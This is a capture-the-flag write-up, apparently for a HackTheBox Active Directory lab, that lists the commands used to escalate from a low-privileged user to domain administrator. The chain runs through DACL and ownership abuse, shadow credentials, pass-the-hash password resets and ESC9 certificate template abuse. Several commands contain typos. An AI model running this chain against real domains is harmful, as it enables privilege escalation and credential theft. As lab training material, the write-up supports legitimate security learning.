Started with a nmap scan
```
53 DNS
88 Kerberos
135
139
389 LDAP
445
636 LDAP
3268 LDAP
3269 LDAP
5985 
```
Domain `certified.htb` Hostname `DC01` This is a assumed breach so we have creds `judith.mader:judith09` 
We can go ahead and get bloodhound data with rusthound `rustchoud-ce --domain certified.htb -u juduth.mader -p judith09 -z` 
And we have WriteOwner over the management group so first we need to edit the ownership of the group and set it to us `bloodyAD --host 10.10.11.41 -d "certified.htb" -u "judith.mader" -p judith09 set owner management judith.mader` now we need to give us full control over the target management group `impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'judith.mader' -target management "certified.htb"/"judith.mader":"judith09"` now we add ourselves to the group `net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%'judith09' -S dc01.certified.htb` and now management has GenericWrite over the `management_svc` user and we can use pywhisker to do shadow creds `python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p judith09 --target "management_svc" --action add` now we have a pfx file we can use certipy to auth and get a NTLM hash `certipy-ad auth -pfx 'b7tI8Jae.pfx' -password 51rSRuXt6n8KVDHFH2aW -dc-ip 10.10.11.41 -domain certified.htb -username management_svc` and now we have the NTLM hash for this account and we can winrm into this account and get the user flag this account also has GenericAll over the `ca_operator` user and we can pass the hash to change there login `pth-net rpc password "ca_operator" "newP@ssword2022" -U "certified.htb"/"management_svc"%"LMHASH":"NTHASH" -S 10.10.11.41` now we own the `ca_operator` user now we can use certipy to check for vulnerable templates since this user has no outbound `certipy-ad find -u ca_operator -p 'newP@ssword2022' -taget certified.htb -text -stdout -vulnerable` and we got ESC9 vulnerability since we all ready did shadow creds we have the hash `cetipy-ad account update -username management_svc@certified.htb -hashes hash -user CA_operator -upn Administrator` Now we need to request the admin cert 
`certipy-ad req -username ca_opertaor@certified.htb -password newP@ssword2022 -target 10.10.11.41 -ca certified-DC01-CA -template CertifiedAuthentication` now we have the admin pfx file and Now we need to change the upn back 
`cetipy-ad account update -username management_svc@certified.htb -hashes hash -user CA_operator -upn ca_operator@certified.htb` now we can auth and get the hash `certipy-ad auth -pfx admin.pfx -dc-ip 10.10.11.41 -domain certified.htb` now we can winrm as admin and get the root flag 